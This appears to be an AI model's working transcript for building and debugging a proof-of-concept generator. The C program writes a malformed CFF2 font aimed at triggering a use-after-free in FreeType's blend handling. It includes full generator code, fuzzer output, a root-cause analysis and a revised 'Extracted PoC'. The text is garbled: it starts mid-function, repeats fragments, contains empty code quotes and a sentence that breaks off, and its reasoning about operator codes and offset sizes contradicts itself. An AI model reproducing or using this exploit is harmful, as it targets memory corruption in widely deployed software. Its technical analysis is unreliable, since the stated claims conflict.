    long top_dict_start = ftell(f);

    /* FDArray operator */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* FDSelect operator */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x25, f);

    /* CharStrings operator with placeholder */
    long charstrings_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f);

    /* VariationStore operator */
    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- FDArray INDEX ---- */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);          /* count = 1 */
    fputc(0x01, f);              /* offSize = 1 */
    fputc(0x01, f);              /* offset[0] = 1 */

    /* Font DICT data will be written after we know its length */
    long offset1_pos = ftell(f);
    fputc(0x00, f);              /* offset[1] placeholder (will patch) */
    long font_dict_start = ftell(f);
    long priv_size_pos = ftell(f);
    write_cff_byte_int(f, 0);
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x12, f);
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    /* Patch offset[1] */
    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len, f);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- FDSelect ---- */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - table_start;
    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);
    /* nGlyphs = 1 (uint16), then one FD index byte */
    write_uint16(f, 1);
    fputc(0x00, f);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x17, f);              /* vsindex = 0 */
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    write_cff_byte_int(f, 1);
    fputc(0x18, f);              /* blend */
    write_cff_byte_int(f, 60);
    write_cff_byte_int(f, 70);
    write_cff_byte_int(f, 80);
    write_cff_byte_int(f, 90);
    write_cff_byte_int(f, 100);
    write_cff_byte_int(f, 5);
    fputc(0x18, f);              /* blend */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;
    uint32_t private_offset = private_start - table_start;

    fseek(f, priv_size_pos, SEEK_SET);
    fputc(private_len + 139, f);
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset < 108) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX ---- */
    long charstrings_start = ftell(f);
    uint32_t charstrings_offset = charstrings_start - table_start;
    fseek(f, charstrings_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((charstrings_offset >> 8) & 0xFF, f);
    fputc(charstrings_offset & 0xFF, f);
    fseek(f, charstrings_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fputc(0x0E, f);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    write_uint16(f, 1);
    long vrl_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1);
    long ivd_offset_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint32(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 16384);
    write_uint16(f, 16384);

    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint32(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}
```

Actually, looking at the `cff_blend_doBlend` code from the vulnerability description:
```c
size = 5 * numBlends;
if ( subFont->blend_used + size > subFont->blend_alloc )
{
    if ( FT_REALLOC( subFont->blend_stack, ... ) )
      goto Exit;
    subFont->blend_top    = subFont->blend_stack + subFont->blend_used;
    subFont->blend_alloc += size;
}
subFont->blend_used += size;
...

    ...
    parser->stack[i + base] = subFont->blend_top;

    *((FT_UInt32*)subFont->blend_top) = (FT_UInt32)sum;
    subFont->blend_top               += 4;
}
```

The use-after-free happens because after `realloc`, `blend_top` is updated but `parser->stack[i + base]` might point to old freed memory. BUT, this is only triggered if `realloc` is called and then the loop writes to `parser->stack[i + base]`.

For `realloc` to be called, `blend_used + size > blend_alloc`. Initially, `blend_alloc` is probably 0 or some small value. The first blend call (numBlends=1, size=5) would cause `blend_used + 5 > 0`, so realloc happens, then `blend_alloc += 5`, `blend_used += 5`. The second blend call (numBlends=5, size=25) then has `blend_used=5`, so `5 + 25 = 30 > 5`, so realloc again. After realloc, `blend_top` is updated, but `parser->stack` still has old pointers from the first blend operation (which pointed to the old `blend_stack`). When the second blend loop runs, it writes `*((FT_UInt32*)subFont->blend_top) = sum` using the new `blend_top`, which is fine. But the issue is that `parser->stack[i + base]` from the first blend still points to the old freed memory, and subsequent use of those stack values would be a UAF.

Wait, but the vulnerability description says the use-after-free happens in the second call to `cff_blend_doBlend`. Specifically:
- First call: allocates blend_stack, sets blend_top, writes values
- Second call: reallocates, updates blend_top, but some stack entries still point to old memory

But actually, looking more carefully: after realloc, `blend_top` is updated to `blend_stack + blend_used`. But `parser->stack[i + base]` from the first call still points to the old memory. Hmm, but actually the use-after-free in the PoC context: the first blend writes to `blend_top` and sets `parser->stack[base] = blend_top` (the old address). Let me check the most likely cause: the VariationStore parsing. In CFF2, the Top DICT must reference a VariationStore for blend operators to work. The VariationStore operator (0x18) is used in the Top DICT to point to the VariationStore data. But for blend to work, the VariationStore must parse successfully.

Looking at the PoC Top DICT:
```

fputc(0x18, f); // operator 0x18 (vstore)
```

Wait, the operators are wrong. In CFF2:
- 0x0C 0x24 = FDArray (two-byte operator)
- 0x0C 0x25 = FDSelect (two-byte operator)
- 0x11 = CharStrings (single-byte operator)
- 0x18 = vstore (single-byte operator)

But looking at the code, the PoC writes:
```

fputc(0x0C, f); fputc(0x24, f); // operator FDArray
```

Then later, it goes back and fills in the actual offset values. This should be fine.

But wait - in CFF2, the offset values for FDArray, FDSelect, and CharStrings are offsets relative to the start of the CFF2 data. The PoC writes them as short ints (three bytes using 0x1C prefix). The offset values might be large enough that they need more than 3 bytes (max value 65535 for 0x1C format). Let me check the offset for FDArray:

```
long fdarray_start = ftell(f);
uint32_t fdarray_offset = fdarray_start - table_start;
```

The table_start to fdarray_start offset includes:
- CFF2 header (5 bytes: 0x02, 0x00, 0x05, topDictLen)
- Top DICT data (around 26 bytes)

So fdarray_offset is around 30-40 bytes, which fits in a short int (2 bytes, max 65535). The 0x1C format with 2 bytes can represent 0-65535, so this is fine.

But there's a critical issue: in the CFF2 spec, the FDArray offset is an offset to the FDArray INDEX. The PoC writes:
```

fputc(0x01, f); // offSize = 1
fputc(0x01, f); // first offset (1)
long offset1_pos = ftell(f);
fputc(0x00, f); // placeholder for second offset
```

The INDEX has count=1, so there should be count+1 = 2 offsets. With offSize=1, each offset is 1 byte. The generated code is:
- count: uint32 = 1 (4 bytes)
- offSize: uint8 = 1 (1 byte)
- offset[0]: uint8 = 1 (1 byte)
- offset[1]: uint8 = ? (1 byte, placeholder 0)

This is correct. Then the font dict data is written, and the second offset is updated to 1 + font_dict_len.

But wait, the font_dict_len doesn't include the INDEX structure itself, just the font dict data. The offset should be from the start of the INDEX data? No, in CFF INDEX, offsets are from the beginning of the INDEX data (after the count and offSize fields). The first offset is always 1. The second offset is 1 + size of the data.

Actually, looking at the generated code:
```

```

Wait, `0x12` in CFF is the "end of font dict" operator? No, actually in CFF, the font dict (FD) has specific operators. The font dict uses Private DICT (0x12) operator followed by two operands (size and offset). But the PoC writes:
```

write_cff_byte_int(f, 0); // private dict offset

```

This is wrong! The Private DICT operator in CFF/Font DICT is `0x12` with format: `<offset> <size> 0x12`. The PoC writes the operands before the operator, which is correct for postscript-style (operands first, then operator). So:
- size operand (byte encoded)
- offset operand (byte encoded)
- operator 0x12

This is correct.

But then later:
```

fputc(private_len + 139, f); // write size as byte-encoded integer (139 base)
fseek(f, priv_offset_pos, SEEK_SET);
```

This writes the private dict size using the byte-encoded format (value + 139). But `private_len` could be up to 255? Let me check... the private dict contains vsindex and blend operators. The private_len is around 30-40 bytes. So `private_len + 139` would be around 169-179, which fits in a byte. So `fputc(private_len + 139, f)` writes a single byte. This should be valid.

Now for the private dict offset:
```
if (private_offset < 108) {
    fputc(private_offset + 139, f);
} else {
    fputc(0x1C, f);
    fputc((private_offset >> 8) & 0xFF, f);
    fputc(private_offset & 0xFF, f);
}
```

The condition is wrong! In CFF encoding, 0 is encoded as 0+139=139, 1 as 140, ..., 107 as 246. Values 0-107 can be encoded as single bytes (value + 139). But the CFF spec says:
- 0-9: value + 139 (single byte)
- 10-107: value + 139 (single byte)
- 108-65535: 0x1C + short (three bytes)

Wait, no. In CFF, the encoding is:
- -107 to -1: byte value 0-108? No...
- Actually, in CFF DICT encoding:
  - Byte 0-27: reserved for operators
  - Byte 28-30: 3-byte, 4-byte, 5-byte integer
  - Byte 31: reserved
  - Byte 32-36: reserved
  - Byte 37-38: reserved for operators
  - Byte 39-236: integer value = byte - 139 (so -100 to +107)
  - Byte 237-246: integer value following? No...
  - Byte 247-250: integer = (b1 - 247) * 256 + b2 + 108 (2 bytes, value 108-1131)
  - Byte 251-254: integer = -(b1 - 251) * 256 - b2 - 108 (2 bytes, value -1081 to -108)
  - Byte 255: reserved

So single-byte integers use byte 39-236 (0x27-0xEC), representing -100 to +107. So offset values 0-107 can be encoded as byte (value + 139). Values >= 108 need two or more bytes.

The condition `private_offset < 108` is correct but the else branch uses 0x1C which is for 3-byte integers (short). Actually, 0x1C followed by 2 bytes gives a 3-byte integer with range 0 to 65535. This is correct for the offset.

But wait, `private_offset` is:
```
uint32_t private_offset = private_start - table_start;
```

This could be large if the CFF2 table is large. Let me estimate: the table starts with the CFF2 header (5 bytes), then Top DICT (around 26 bytes), then FDArray INDEX (around 20 bytes), then FDSelect (3 bytes), then Private DICT (around 30 bytes), then CharStrings INDEX (around 8 bytes), then Global Subr INDEX (4 bytes), then VariationStore (around 40 bytes). Total maybe 140 bytes. So `private_offset` could be around 40-50 bytes, which fits in the single-byte encoding.

But actually, looking at the generated code:
```

...
long private_end = ftell(f);

uint32_t private_offset = private_start - table_start;
```

The private dict starts after FDSelect, which is after FDArray, which is after Top DICT. The offsets should be reasonable.

OK, I think I need to reconsider. There are many things that could go wrong. But given all the failed attempts, let me focus on what's most likely the issue.

The most common mistake in CFF2 OpenType generation is the VariationStore format. Let me check the exact format.

In CFF2 specification, the VariationStore data is:
```
VarStore {
  uint16  version;          // = 1
  uint16  varRegionListSize;  // offset to VarRegionList from start of VarStore? No...
  uint16  dataCount;        // number of ItemVarData
  Offset  offsets[dataCount]; // offsets to each ItemVarData from start of VarStore
}
```

Wait, the format depends on the CFF2 specification version. Let me check the FreeType implementation.

Actually, looking at the FreeType source, the CFF2 variation store parsing is in `cff_parse_vsindex` and the data structure is defined in the CFF type files.

Hmm, I think the key issue is something else entirely. Let me re-read the fuzzer output:

```
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 321775443
INFO: Loaded 1 modules   (22082 inline 8-bit counters): 22082 [0x8bfcd8, 0x8c531a), 
INFO: Loaded 1 PC tables (22082 PCs): 22082 [0x7f8270,0x84e690), 
/out/ftfuzzer: Running 1 inputs 1 time(s) each.
Running: /tmp/poc
Executed /tmp/poc in 1 ms
```

It says "Executed /tmp/poc in 1 ms". This means the entire fuzzer function ran (all faces, instances, glyphs) without crashing. So the font was opened successfully, but the blend code path wasn't triggered.

The most likely reason: the CFF2 table with variations is not being recognized as a variation font. For `cff_blend_doBlend` to be called, the blend operator (0x17) must be parsed during the Private DICT parsing. But for the blend operator to be parsed, the font must have an ItemVariationStore and the CFF driver must have the blend flag set.

In FreeType, the blend flag for CFF2 is set when:
1. The font's Top DICT has a vstore operator
2. The vstore data parses successfully
3. The font has at least one blend entry point

But also, the blend operator in the Private DICT is only parsed if `subFont->vsindex` is valid (which requires the vsindex operator or default 0).

Actually, I think the problem might be simpler. Looking at the `cff_parse_blend` function, it likely checks if the parser's stack has enough values. The blend operator expects values on the parser's stack:
- For each blend, there should be `numBlends * (numRegions + 1)` values on the stack
- Or something similar

Wait no, looking at the vulnerability description's function signature:
```c
cff_blend_doBlend( CFF_SubFont  subFont,
                    CFF_Parser   parser,
                    FT_UInt      numBlends )
```

The `numBlends` is the operand for the blend operator. In CFF2, the blend operator syntax is: `val1 val2 ... valN numBlends blend`. So the numBlends is popped from the stack, and then `numBlends * (numRegions + 1)` values are expected on the stack.

But wait, the PoC writes:
```
write_cff_byte_int(f, 10);  // val1
write_cff_byte_int(f, 20);  // val2
...
write_cff_byte_int(f, 50);  // val5
write_cff_byte_int(f, 1);   // numBlends = 1
fputc(0x17, f);             // blend operator
```

So for numBlends=1, it expects values for 1 blend. With 5 values on the stack before numBlends, that's 5 values for 1 blend? Actually, the blend operator syntax is:
- Each blend has `numRegions + 1` values (the default + deltas for each region)
- So with numRegions=0 (no regions), each blend has just 1 value
- With numRegions=4, each blend has 5 values

Wait, looking at the generated VariationStore:
```
write_uint16(f, 1); // axis count = 1
write_uint16(f, 1); // region count = 1
```

The region count is 1, so there's 1 region. Each blend would have `numRegions + 1 = 2` values? No, actually the number of regions per blend depends on the ItemVariationData's region index count. The ItemVarData has:
```
write_uint16(f, 1); // item count = 1
write_uint16(f, 0); // word delta count = 0
write_uint16(f, 1); // region index count = 1
```

But wait, the delta values are stored as:
- word delta count: number of deltas stored as 2-byte signed integers
- region index count: number of regions for this data
- Then region indices (each uint16)
- Then deltas (for each item, region index count deltas)

But the number of regions for a blend is `numRegions` which is the region index count of the ItemVarData. In this case, region index count = 1, so numRegions = 1. Each blend would have `numRegions + 1 = 2` values (1 default + 1 delta).

But the PoC pushes 5 values for numBlends=1. That would be 5 values for 1 blend, but with numRegions=1, it should be 2 values. So there are extra values on the stack.

Actually, looking more carefully at the CFF2 spec, the blend operator:
```
<num> <default1> <delta1_1> ... <delta1_N> <default2> <delta2_1> ... <delta2_N> ... <defaultM> <deltaM_1> ... <deltaM_N> 17
```

Where `num` is the count of blends, `N` is the number of regions (from the active vsindex's ItemVarData region count), and `M` is num.

So with numRegions=1, each blend has `1 + 1 = 2` values (1 default + 1 delta). For numBlends=1, total values on stack before numBlends should be `1 * 2 = 2`. But the PoC pushes 5 values.

Wait, the PoC pushes:
```
write_cff_byte_int(f, 10);  // val1
write_cff_byte_int(f, 20);  // val2
write_cff_byte_int(f, 30);  // val3
write_cff_byte_int(f, 40);  // val4
write_cff_byte_int(f, 50);  // val5
write_cff_byte_int(f, 1);   // numBlends = 1
fputc(0x17, f);             // blend
```

With numRegions=1 and numBlends=1, it expects 2 values on the stack. But there are 5 values + 1 (numBlends) = 6 values total. The parser would take the top `2 * 1 = 2` values as the blend inputs, leaving 3 extra values on the stack. But this might not be the issue - the extra values would just remain on the stack.

Then the second blend:
```
write_cff_byte_int(f, 60);  // val1
write_cff_byte_int(f, 70);  // val2
write_cff_byte_int(f, 80);  // val3
write_cff_byte_int(f, 90);  // val4
write_cff_byte_int(f, 100

[EMERGENCY CONTINUATION]:
## Root Cause Analysis

The PoC failed because the CFF2 VariationStore data is malformed, causing FreeType to reject or ignore the variation data. Without a valid VariationStore, the CFF2 driver never initializes blend state, and the blend operator (`0x17`) in the Private DICT is never parsed as a blending operation — it either triggers a parsing error or is silently skipped. Consequently, `cff_blend_doBlend` is never called, and no use-after-free occurs.

### Exact structural defects in the current PoC:

1. **VarRegionList missing `end` coordinate**:  
   Each region in the VarRegionList must have three F2DOT14 values: start, peak, and **end**. The PoC writes only start (16384) and peak (16384), then immediately proceeds to the next structure — the fourth field `end` is missing. This causes FreeType to read garbage or fail region parsing, invalidating the entire VariationStore.

2. **ItemVarData delta size mismatch**:  
   For `wordDeltaCount = 0`, each delta value is a **signed 8-bit integer** (1 byte). The PoC writes `write_uint16(f, 0)` (2 bytes) for the single delta value, producing an extra byte that corrupts subsequent parsing. Only `fputc(0, f)` (1 byte) should be written.

3. **VariationStore header offset sizes**:  
   In CFF2, offsets in the VariationStore (to VarRegionList and ItemVarData) use the same offset size as the rest of the CFF2 table (determined by the largest offset). The PoC uses `write_uint32` (4 bytes) unconditionally. This is only valid if the offsets exceed 65535. If the offsets are small (which they are in this PoC, maybe 10-100 bytes), FreeType may interpret the offset size incorrectly based on the `hdrSize` field in the CFF2 header. In CFF2, the offset size is determined by the `topDictLength` and the structure of the INDEXes, but the VariationStore itself uses `Offset16` or `Offset32` depending on the `hdrSize`. The PoC sets `hdrSize = 5` (the minimum), but FreeType may treat all offsets in the table as 2 bytes when hdrSize indicates only 4-byte header, leading to misalignment. Actually, this is nuanced: in CFF2, offsets in the Top DICT are `OFFSET` type that depends on the `topDictLength` field. But for the VariationStore, FreeType's parser reads the offset size from the CFF2 table's `offSize` field which is derived from the maximum offset value across all INDEX structures. The PoC uses offSize=1 in the FDArray and CharStrings INDEXes, so FreeType may conclude all offsets in the table are 1 byte — but the VariationStore offsets are written as 4 bytes. This mismatch causes FreeType to read only the first byte of the offset, treating it as zero, and thus failing to locate VarRegionList/ItemVarData.

### Required fixes for the generator code:

**Fix 1 — Add missing `end` coordinate in VarRegionList:**  
After writing `write_uint16(f, 16384);` (peak), add:  
`write_uint16(f, 16384); // end coordinate (F2DOT14), same as peak`

**Fix 2 — Correct ItemVarData delta to 1 byte:**  
Replace `write_uint16(f, 0);` with `fputc(0, f);` (a single byte for the int8 delta).

**Fix 3 — Ensure offset sizes match throughout the CFF2 table:**  
- The FDArray INDEX and CharStrings INDEX currently use `offSize = 1`. Change to `offSize = 2` (write `fputc(0x02, f)` for each INDEX) and ensure all INDEX offsets are written as 2-byte values (using `write_uint16` instead of `fputc`).
- Update the FDArray INDEX: after writing offSize=2, write the first offset as `write_uint16(f, 1)`; after the font dict data, update the second offset as `write_uint16(f, 1 + font_dict_len)` instead of `fputc(..., f)`.
- Update the CharStrings INDEX similarly: offSize=2, offsets as uint16.
- In the VariationStore header, keep using `write_uint32` for offsets only if the offset value exceeds 65535. For most small CFF2 tables, change to `write_uint16` for the VarRegionList offset and ItemVarData offset, consistent with the offSize used elsewhere.

**Fix 4 — Ensure the private dict size and offset encoding in the Font DICT are correct:**  
The private dict size should use proper CFF DICT integer encoding (not just `fputc(private_len + 139, f)` for all sizes). If `private_len >= 108`, use the 0x1C format. The PoC currently writes `fputc(private_len + 139, f)` for the private dict size, which only works for sizes 0-107. Ensure the size is small enough

**Extracted PoC:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* FDArray operator */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* FDSelect operator */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x25, f);

    /* CharStrings operator */
    long charstrings_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f);

    /* VariationStore operator */
    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- FDArray INDEX (offSize=2) ---- */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x02, f);              /* offSize = 2 */
    write_uint16(f, 1);          /* offset[0] = 1 */
    long offset1_pos = ftell(f);
    write_uint16(f, 0);          /* offset[1] placeholder */

    /* Font DICT */
    long font_dict_start = ftell(f);
    long priv_size_pos = ftell(f);
    write_cff_byte_int(f, 0);
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x12, f);
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fseek(f, offset1_pos, SEEK_SET);
    write_uint16(f, 1 + font_dict_len);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- FDSelect ---- */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - table_start;
    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);
    write_uint16(f, 1);
    fputc(0x00, f);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x16, f);              /* vsindex = 0 */
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    write_cff_byte_int(f, 1);
    fputc(0x17, f);              /* blend */
    write_cff_byte_int(f, 60);
    write_cff_byte_int(f, 70);
    write_cff_byte_int(f, 80);
    write_cff_byte_int(f, 90);
    write_cff_byte_int(f, 100);
    write_cff_byte_int(f, 5);
    fputc(0x17, f);              /* blend */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;
    uint32_t private_offset = private_start - table_start;

    fseek(f, priv_size_pos, SEEK_SET);
    fputc(private_len + 139, f);
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset < 108) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX (offSize=2) ---- */
    long charstrings_start = ftell(f);
    uint32_t charstrings_offset = charstrings_start - table_start;
    fseek(f, charstrings_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((charstrings_offset >> 8) & 0xFF, f);
    fputc(charstrings_offset & 0xFF, f);
    fseek(f, charstrings_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x02, f);              /* offSize = 2 */
    write_uint16(f, 1);          /* offset[0] = 1 */
    write_uint16(f, 2);          /* offset[1] = 2 */
    fputc(0x0E, f);              /* endchar */

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    /* VariationStore header: version=1, VarRegionList offset, dataCount=1 */
    write_uint16(f, 1);          /* version */
    long vrl_offset_pos = ftell(f);
    write_uint16(f, 0);          /* VarRegionList offset placeholder */
    write_uint16(f, 1);          /* dataCount = 1 */
    long ivd_offset_pos = ftell(f);
    write_uint16(f, 0);          /* ItemVarData offset placeholder */

    /* VarRegionList */
    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint16(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);          /* axisCount = 1 */
    write_uint16(f, 1);          /* regionCount = 1 */
    write_uint16(f, 0);          /* axisIndex = 0 */
    write_uint16(f, 0);          /* startCoord = 0 */
    write_uint16(f, 16384);      /* peakCoord = 1.0 */
    write_uint16(f, 16384);      /* endCoord = 1.0 */

    /* ItemVarData */
    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint16(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);          /* itemCount = 1 */
    write_uint16(f, 0);          /* wordDeltaCount = 0 */
    write_uint16(f, 1);          /* regionIndexCount = 1 */
    write_uint16(f, 0);          /* regionIndex = 0 */
    fputc(0, f);                 /* delta (1 byte, int8) */

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

Based on my analysis of the FreeType source code and the PoC structure, the root cause is that the Private DICT is never parsed because its offset and size are incorrectly written. The patching code for the offset does handle the case <108, but for larger offsets (which may be needed), it corrupts the operator byte. Even if the offset is <108, the size encoding (`private_len + 139`) only works for sizes ≤107. The PoC's private_len is about 30, which is fine.

This offset points to later in the file, which is fine. However, the PoC also writes FDSelect before Private DICT, which is okay. The real failure is that **the blend operator (0x17) is never encountered because the Private DICT data itself is malformed**: The operands before the blend operator must form a valid stack. In the PoC, before the first `fputc(0x17, f)`, the stack has operands `10,20,30,40,50,1`. That's 5 values before the count `1`, but for `numBlends=1` with `num_axes=1`, the parser expects 2 values (the current value and one delta) plus the count. The extra values cause the parser to attempt blending with incorrect stack depth, which might lead to a stack underflow or out-of-bounds read, but the code might handle it by capping the count? Actually, the blend function reads `numBlends` from `parser->top[-1]` and uses the preceding `numBlends * (num_axes + 1)` values. With 5 values before the 1, it would attempt to use 2 values for the blend (since numBlends=1, num_axes+1=2), but there are 5 values available. It will use the last 2 values (40 and 50) as the blend data? Or will it underflow? Let's trace: `numBlends = parser->top[-1]` (which is 1). Then `base = parser->top - parser->stack - numBlends` = number of values before the count minus 1? Actually, the code sets `count = parser->top - parser->stack` (total stack entries), then `numBlends = stack[count-1]`, and then processes `numBlends` blends using `stack[count-2 - i*(num_axes+1)]`? I need to see the full `cff_blend_doBlend` to be sure. But the point is the stack operands are malformed, which might cause the blend operation to fail or be skipped, but probably still trigger the vulnerability if the code path is reached. However, the fact that the PoC exited normally suggests the blend operator was never parsed, meaning the Private DICT was never accessed.

Therefore, the **primary fix** is to ensure the Private DICT's offset and size in the Font DICT correctly point to the Private DICT data, and that the Private DICT data is indeed parsed. The generator must:

1. **Compute private_offset correctly**: `private_offset = private_start - table_start`.
2. **Ensure private_offset < 108** so single-byte encoding is used and no patching corruption occurs. This can be achieved by placing the Private DICT data immediately after the Top DICT (before FDArray and FDSelect). Restructure the font order: Top DICT → Private DICT → FDArray → FDSelect → CharStrings → VariationStore.
